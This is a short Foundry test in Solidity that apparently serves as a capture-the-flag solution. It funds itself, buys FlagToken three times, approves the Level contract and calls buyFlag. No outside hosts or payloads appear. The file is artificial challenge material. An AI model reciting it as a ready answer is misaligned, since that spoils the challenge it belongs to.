// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/1.sol";
//import "../src/Counter.sol";

contract CounterTest is Test{
    Level public level;
    FlagToken public Ft;


    function setUp() public{
    
        level = Level( 0xc10C412E0E609d9F470d076Dab9a8198c67612de);
        Ft = FlagToken(address(0x9e96D747FFA7595ac7325bdA8DE6c2EDeb0c0646));
        
    }

    function testPoc() public{
        vm.deal(address(this), 100 ether);
        Ft.buyFlagToken{value:3 ether}(2 ether);
        Ft.buyFlagToken{value:3 ether}(2 ether);
        Ft.buyFlagToken{value:3 ether}(2 ether);
        Ft.approve(address(level), 6 ether);
        level.buyFlag();
    }
}